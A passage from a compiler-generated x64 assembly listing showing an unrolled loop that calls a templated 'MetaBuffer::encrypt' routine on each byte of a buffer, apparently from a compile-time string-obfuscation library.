  00367	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  0036c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00373	88 41 14	 mov	 BYTE PTR [rcx+20], al
  00376	b8 01 00 00 00	 mov	 eax, 1
  0037b	48 6b c0 14	 imul	 rax, rax, 20
  0037f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00386	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0038a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00391	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  00396	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0039d	88 41 15	 mov	 BYTE PTR [rcx+21], al
  003a0	b8 01 00 00 00	 mov	 eax, 1
  003a5	48 6b c0 15	 imul	 rax, rax, 21
  003a9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  003b0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  003b4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003bb	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  003c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003c7	88 41 16	 mov	 BYTE PTR [rcx+22], al
  003ca	b8 01 00 00 00	 mov	 eax, 1
  003cf	48 6b c0 16	 imul	 rax, rax, 22
  003d3	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  003da	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  003de	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003e5	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  003ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003f1	88 41 17	 mov	 BYTE PTR [rcx+23], al
  003f4	b8 01 00 00 00	 mov	 eax, 1
  003f9	48 6b c0 17	 imul	 rax, rax, 23
  003fd	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00404	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00408	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0040f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  00414	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0041b	88 41 18	 mov	 BYTE PTR [rcx+24], al
  0041e	b8 01 00 00 00	 mov	 eax, 1
  00423	48 6b c0 18	 imul	 rax, rax, 24
  00427	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0042e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00432	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00439	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  0043e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00445	88 41 19	 mov	 BYTE PTR [rcx+25], al
  00448	b8 01 00 00 00	 mov	 eax, 1
  0044d	48 6b c0 19	 imul	 rax, rax, 25
  00451	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00458	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0045c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00463	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  00468	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0046f	88 41 1a	 mov	 BYTE PTR [rcx+26], al
  00472	b8 01 00 00 00	 mov	 eax, 1
  00477	48 6b c0 1a	 imul	 rax, rax, 26
  0047b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00482	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00486	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0048d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  00492	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00499	88 41 1b	 mov	 BYTE PTR [rcx+27], al
  0049c	b8 01 00 00 00	 mov	 eax, 1
  004a1	48 6b c0 1b	 imul	 rax, rax, 27
  004a5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  004ac	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  004b0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004b7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  004bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004c3	88 41 1c	 mov	 BYTE PTR [rcx+28], al
  004c6	b8 01 00 00 00	 mov	 eax, 1
  004cb	48 6b c0 1c	 imul	 rax, rax, 28
  004cf	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  004d6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  004da	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004e1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  004e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004ed	88 41 1d	 mov	 BYTE PTR [rcx+29], al
  004f0	b8 01 00 00 00	 mov	 eax, 1
  004f5	48 6b c0 1d	 imul	 rax, rax, 29
  004f9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00500	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00504	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0050b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  00510	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00517	88 41 1e	 mov	 BYTE PTR [rcx+30], al
  0051a	b8 01 00 00 00	 mov	 eax, 1
  0051f	48 6b c0 1e	 imul	 rax, rax, 30
  00523	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0052a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0052e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00535	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  0053a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00541	88 41 1f	 mov	 BYTE PTR [rcx+31], al
  00544	b8 01 00 00 00	 mov	 eax, 1
  00549	48 6b c0 1f	 imul	 rax, rax, 31
  0054d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00554	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00558	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0055f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  00564	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0056b	88 41 20	 mov	 BYTE PTR [rcx+32], al
  0056e	b8 01 00 00 00	 mov	 eax, 1
  00573	48 6b c0 20	 imul	 rax, rax, 32		; 00000020H
  00577	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0057e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00582	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00589	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  0058e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00595	88 41 21	 mov	 BYTE PTR [rcx+33], al
  00598	b8 01 00 00 00	 mov	 eax, 1
  0059d	48 6b c0 21	 imul	 rax, rax, 33		; 00000021H
  005a1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  005a8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  005ac	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005b3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  005b8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005bf	88 41 22	 mov	 BYTE PTR [rcx+34], al
  005c2	b8 01 00 00 00	 mov	 eax, 1
  005c7	48 6b c0 22	 imul	 rax, rax, 34		; 00000022H
  005cb	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  005d2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  005d6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005dd	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  005e2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005e9	88 41 23	 mov	 BYTE PTR [rcx+35], al
  005ec	b8 01 00 00 00	 mov	 eax, 1
  005f1	48 6b c0 23	 imul	 rax, rax, 35		; 00000023H
  005f5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  005fc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00600	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00607	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  0060c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00613	88 41 24	 mov	 BYTE PTR [rcx+36], al
  00616	b8 01 00 00 00	 mov	 eax, 1
  0061b	48 6b c0 24	 imul	 rax, rax, 36		; 00000024H
  0061f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00626	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0062a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00631	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  00636	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0063d	88 41 25	 mov	 BYTE PTR [rcx+37], al
  00640	b8 01 00 00 00	 mov	 eax, 1
  00645	48 6b c0 25	 imul	 rax, rax, 37		; 00000025H
  00649	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00650	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00654	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0065b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  00660	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00667	88 41 26	 mov	 BYTE PTR [rcx+38], al
  0066a	b8 01 00 00 00	 mov	 eax, 1
  0066f	48 6b c0 26	 imul	 rax, rax, 38		; 00000026H
  00673	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0067a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0067e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00685	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  0068a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00691	88 41 27	 mov	 BYTE PTR [rcx+39], al
  00694	b8 01 00 00 00	 mov	 eax, 1
  00699	48 6b c0 27	 imul	 rax, rax, 39		; 00000027H
  0069d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  006a4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  006a8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006af	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  006b4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006bb	88 41 28	 mov	 BYTE PTR [rcx+40], al
  006be	b8 01 00 00 00	 mov	 eax, 1
  006c3	48 6b c0 28	 imul	 rax, rax, 40		; 00000028H
  006c7	48 8b 8d f8 00
